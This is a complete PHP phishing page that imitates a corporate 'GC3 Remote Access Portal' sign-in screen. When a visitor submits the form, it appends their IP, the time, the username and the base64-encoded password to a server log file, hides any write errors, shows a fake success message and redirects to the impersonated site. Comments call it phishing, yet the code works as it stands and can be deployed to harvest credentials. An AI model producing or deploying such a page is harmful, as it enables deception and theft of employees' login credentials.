<?php
// gc3-login.php

// ==================== CONFIG ====================
$logfile = '/var/www/logs/logins.txt';

// Ensure directory exists and is writable (in real attacks this is often pre-created)
$logdir = dirname($logfile);
if (!is_dir($logdir)) {
    @mkdir($logdir, 0755, true);
}

// ==================== HANDLE FORM SUBMISSION ====================
$login_success = false;
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if (!empty($username) && !empty($password)) {
        // Base64-encode the password (very weak obfuscation)
        $encoded_pass = base64_encode($password);

        // Format: IP | Timestamp | Username | Base64(Password)
        $log_entry = sprintf(
            "%s | %s | %s | %s\n",
            $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            date('Y-m-d H:i:s'),
            $username,
            $encoded_pass
        );

        // Append to log file (silently fail if can't write — typical in stealthy variants)
        @file_put_contents($logfile, $log_entry, FILE_APPEND | LOCK_EX);

        // Pretend login succeeded (real pages often redirect or show fake success)
        $login_success = true;
    } else {
        $error = 'Please enter both username and password.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GC3 Remote Access</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #0d6efd;
      --primary-dark: #0a58ca;
      --text: #212529;
      --text-light: #6c757d;
      --bg: #f8f9fa;
      --card: #ffffff;
      --border: #dee2e6;
    }

    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Inter', system-ui, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    header {
      background: var(--card);
      border-bottom: 1px solid var(--border);
      padding: 1rem 2rem;
      display: flex;
      align-items: center;
      gap: 1rem;
    }
    .logo {
      font-weight: 700;
      font-size: 1.8rem;
      color: var(--primary);
      letter-spacing: -1px;
    }
    main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 2rem 1rem;
    }
    .login-container {
      background: var(--card);
      border-radius: 8px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 420px;
      padding: 2.5rem 2rem;
      border: 1px solid var(--border);
    }
    h1 { font-size: 1.8rem; font-weight: 600; margin-bottom: 0.5rem; }
    .subtitle { color: var(--text-light); font-size: 1rem; margin-bottom: 2rem; }
    .form-group { margin-bottom: 1.5rem; }
    label { display: block; margin-bottom: 0.5rem; font-size: 0.95rem; font-weight: 500; }
    input {
      width: 100%;
      padding: 0.9rem 1rem;
      border: 1px solid var(--border);
      border-radius: 6px;
      font-size: 1rem;
      transition: border-color 0.2s;
    }
    input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(13,110,253,0.25);
    }
    .options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 1.25rem 0 1.75rem;
      font-size: 0.95rem;
      flex-wrap: wrap;
      gap: 1rem;
    }
    .checkbox-label { display: flex; align-items: center; gap: 0.5rem; color: var(--text-light); cursor: pointer; }
    input[type="checkbox"] { width: 16px; height: 16px; accent-color: var(--primary); }
    .forgot { color: var(--primary); text-decoration: none; }
    .forgot:hover { text-decoration: underline; }
    button {
      width: 100%;
      padding: 1rem;
      background: var(--primary);
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 1.05rem;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }
    button:hover { background: var(--primary-dark); }
    .error { color: #dc3545; font-size: 0.9rem; margin-bottom: 1rem; text-align: center; }
    .success { color: #198754; font-size: 1.1rem; text-align: center; margin: 2rem 0; }
    footer {
      text-align: center;
      padding: 1.5rem;
      color: var(--text-light);
      font-size: 0.85rem;
      border-top: 1px solid var(--border);
      background: var(--card);
    }
    footer a { color: var(--primary); text-decoration: none; }
    footer a:hover { text-decoration: underline; }
    .version { text-align: center; color: var(--text-light); font-size: 0.8rem; margin-top: 1.5rem; }
    @media (max-width: 480px) {
      .login-container { padding: 2rem 1.5rem; border-radius: 0; box-shadow: none; border: none; }
    }
  </style>
</head>
<body>

  <header>
    <div class="logo">GC3</div>
    <span style="font-weight:600; font-size:1.1rem;">GC3 Remote Access Portal</span>
  </header>

  <main>
    <div class="login-container">

      <?php if ($login_success): ?>
        <div class="success">
          Authentication successful.<br>
          Redirecting to your desktop... (this may take a few seconds)
        </div>
        <!-- In real phishing: meta refresh or JS redirect to actual site or blank page -->
        <meta http-equiv="refresh" content="3;url=https://gc3.com/dashboard">
      <?php else: ?>

        <?php if ($error): ?>
          <div class="error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>

        <h1>Sign In</h1>
        <div class="subtitle">Access your remote desktop, applications, and corporate resources securely.</div>

        <form method="post" action="">
          <div class="form-group">
            <label for="user">Username</label>
            <input type="text" name="username" id="user" placeholder="username@gc3.com  or  GC3\username" autocomplete="username" required value="<?= htmlspecialchars($_POST['username'] ?? '') ?>" />
          </div>

          <div class="form-group">
            <label for="pass">Password</label>
            <input type="password" name="password" id="pass" placeholder="Enter your password" autocomplete="current-password" required />
          </div>

          <div class="options">
            <label class="checkbox-label">
              <input type="checkbox" id="remember" name="remember" />
              <span>Keep me signed in on this device</span>
            </label>
            <a href="#" class="forgot">Forgot password?</a>
          </div>

          <button type="submit">Sign In</button>
        </form>

        <div class="version">Remote Desktop Web Access • Version 3.2.1<br>Protected by GC3 Security Services</div>

      <?php endif; ?>

    </div>
  </main>

  <footer>
    © 2026 GC3. All rights reserved.<br>
    <a href="#">Privacy Policy</a> • 
    <a href="#">Terms of Use</a> • 
    <a href="#">Support</a>
  </footer>

</body>
</html>
